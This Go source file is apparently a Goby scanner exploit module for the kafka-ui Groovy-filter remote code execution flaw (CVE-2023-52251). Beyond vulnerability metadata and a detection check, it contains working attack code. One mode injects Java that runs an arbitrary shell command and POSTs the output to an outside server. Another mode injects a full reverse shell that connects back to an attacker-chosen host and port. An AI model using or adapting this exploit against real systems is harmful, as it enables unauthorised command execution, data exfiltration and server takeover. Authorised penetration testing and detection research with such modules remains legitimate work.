package exploits

import (
	"encoding/json"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "kafka-ui messages remote code execution vulnerability (CVE-2023-52251)",
    "Description": "<p>The kafka-ui project is developed and maintained by Provectus Company and aims to provide Kafka users with a visual management tool to simplify the management and monitoring tasks of Kafka clusters.</p><p>kafka-ui has a remote code execution vulnerability in the q parameter of /api/clusters/local/topics/{topic}/messages. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then Control the entire web server.</p>",
    "Product": "kafka-ui",
    "Homepage": "https://github.com/provectus/kafka-ui",
    "DisclosureDate": "2024-01-25",
    "PostTime": "2024-02-28",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "body=\"fonts/RobotoMono-Regular.ttf\" || body=\"/fonts/RobotoMono-Medium.ttf\" || body=\"UI for Apache Kafka\"",
    "GobyQuery": "body=\"fonts/RobotoMono-Regular.ttf\" || body=\"/fonts/RobotoMono-Medium.ttf\" || body=\"UI for Apache Kafka\"",
    "Level": "3",
    "Impact": "<p>kafka-ui has a remote code execution vulnerability in the q parameter of /api/clusters/local/topics/{topic}/messages. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then Control the entire web server.</p>",
    "Recommendation": "<p>1. The vulnerability has not been officially fixed yet. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://github.com/provectus/kafka-ui\">https://github.com/provectus/kafka-ui</a>;</p><p>2. Set access policies through security devices such as firewalls and set whitelist access;</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-52251"
    ],
    "CNNVD": [
        "CNNVD-202401-2265"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "kafka-ui messages 远程代码执行漏洞（CVE-2023-52251）",
            "Product": "kafka-ui",
            "Description": "<p>kafka-ui 项目是由 Provectus 公司开发和维护的，旨在为 Kafka 用户提供一个可视化管理工具，简化 Kafka 集群的管理和监控任务。</p><p>kafka-ui 在 /api/clusters/local/topics/{topic}/messages 的 q 参数中存在远程代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/provectus/kafka-ui\" target=\"_blank\">https://github.com/provectus/kafka-ui</a>；</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问；</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>kafka-ui 在 /api/clusters/local/topics/{topic}/messages 的 q 参数中存在远程代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "kafka-ui messages remote code execution vulnerability (CVE-2023-52251)",
            "Product": "kafka-ui",
            "Description": "<p>The kafka-ui project is developed and maintained by Provectus Company and aims to provide Kafka users with a visual management tool to simplify the management and monitoring tasks of Kafka clusters.</p><p>kafka-ui has a remote code execution vulnerability in the q parameter of /api/clusters/local/topics/{topic}/messages. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then Control the entire web server.</p>",
            "Recommendation": "<p>1. The vulnerability has not been officially fixed yet. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://github.com/provectus/kafka-ui\" target=\"_blank\">https://github.com/provectus/kafka-ui</a>;</p><p>2. Set access policies through security devices such as firewalls and set whitelist access;</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>kafka-ui has a remote code execution vulnerability in the q parameter of /api/clusters/local/topics/{topic}/messages. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then Control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10928"
}`
	sendPayloadFlagvxlhrv := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		clutersRequestConfig := httpclient.NewGetRequestConfig(`/api/clusters`)
		clutersRequestConfig.VerifyTls = true
		clutersRequestConfig.FollowRedirect = false
		var clusters []map[string]interface{}
		if resp, err := httpclient.DoHttpRequest(hostInfo, clutersRequestConfig); resp != nil {
			if err := json.Unmarshal([]byte(resp.RawBody), &clusters); err != nil {
				return nil, err
			}
		} else if err != nil {
			return nil, err
		} else {
			return nil, errors.New("cluster 读取失败")
		}
		for _, cluster := range clusters {
			clusterName := cluster["name"].(string)
			topicRequestConfig := httpclient.NewGetRequestConfig(`/api/clusters/` + clusterName + `/topics?showInternal=true&search=&orderBy=NAME&sortOrder=ASC`)
			topicRequestConfig.VerifyTls = true
			topicRequestConfig.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(hostInfo, topicRequestConfig); resp != nil {
				var respJson map[string]interface{}
				if err := json.Unmarshal([]byte(resp.RawBody), &respJson); err != nil {
					continue
				}
				pageCount, err := strconv.Atoi(fmt.Sprintf("%v", respJson["pageCount"]))
				if err != nil {
					continue
				}
				if pageCount < 1 {
					continue
				}
				topics := respJson["topics"].([]interface{})
				for _, topic := range topics {
					topic := topic.(map[string]interface{})
					segmentSize, err := strconv.Atoi(fmt.Sprintf("%v", topic["segmentSize"]))
					if err != nil {
						continue
					}
					if segmentSize < 1 {
						continue
					}
					topicName := topic["name"].(string)
					payloadRequestConfig := httpclient.NewGetRequestConfig(`/api/clusters/` + clusterName + `/topics/` + topicName + `/messages?q=` + url.QueryEscape(payload) + `&filterQueryType=GROOVY_SCRIPT&attempt=0&limit=100&seekDirection=FORWARD&seekType=OFFSET&seekTo=0::0`)
					payloadRequestConfig.VerifyTls = true
					payloadRequestConfig.FollowRedirect = false
					return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
				}
			} else if err != nil {
				return nil, err
			}
		}
		return nil, errors.New("漏洞检测失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkFlag := goutils.RandomHexString(16)
			checkUrl, _ := godclient.GetGodCheckURL(checkFlag)
			if !strings.Contains(checkUrl, "http://") && !strings.Contains(checkUrl, "https://") {
				checkUrl = "http://" + checkUrl
			}
			if resp, _ := sendPayloadFlagvxlhrv(hostinfo, `new URL("`+checkUrl+`").text`); resp != nil {
				return godclient.PullExists(checkFlag, 15*time.Second)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "cmd" {
				filename := goutils.RandomHexString(16) + ".txt"
				gid := godclient.GetGid()
				sendPayloadFlagvxlhrv(expResult.HostInfo, `String cmd = "`+goutils.B2S(stepLogs.Params["cmd"])+`";Process p = new ProcessBuilder(System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd", "/c", cmd}: new String[]{"sh", "-c",cmd}).redirectErrorStream(true).start();HttpURLConnection urlConnection = (HttpURLConnection)new URL("`+fmt.Sprintf("%s/api/v1/hostFile?gid=%s&filename=%s", httpclient.NewFixUrl(godclient.GodServerAddr).FixedHostInfo, godclient.GetGid(), filename)+`").openConnection();urlConnection.setRequestMethod("POST");urlConnection.setRequestProperty("Content-Type", "text/plain;charset=UTF-8");urlConnection.setDoOutput(true);new DataOutputStream(urlConnection.getOutputStream()).write(new Scanner(p.getInputStream()).useDelimiter("\\a").next().getBytes());urlConnection.getResponseCode();urlConnection.disconnect();`)
				if resp, err := httpclient.SimpleGet(fmt.Sprintf("%s/i/%s/%s", godclient.GodServerAddr, gid, filename)); resp.StatusCode == 200 && len(resp.RawBody) > 0 {
					expResult.Success = true
					expResult.Output = resp.RawBody
				} else if err != nil {
					expResult.Output = err.Error()
				}
				defer httpclient.SimpleGet(fmt.Sprintf("%s/api/v1/hostFile?gid=%s&filename=%s&clear=true", godclient.GodServerAddr, godclient.GetGid(), filename))
			} else if attackType == "reverse" {
				//sendPayloadFlagvxlhrv()
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				addr := godclient.GetGodServerHost()
				ip := net.ParseIP(addr)
				if ip != nil {
					addr = ip.String()
				} else {
					ips, err := net.LookupIP(addr)
					if err != nil {
						expResult.Output = err.Error()
						return expResult
					}
					addr = ips[0].String()
				}
				sendPayloadFlagvxlhrv(expResult.HostInfo, `String host="`+addr+`";int port=`+rp+`;String shell=System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe":"/bin/sh";Process p=new ProcessBuilder(shell).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {
p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
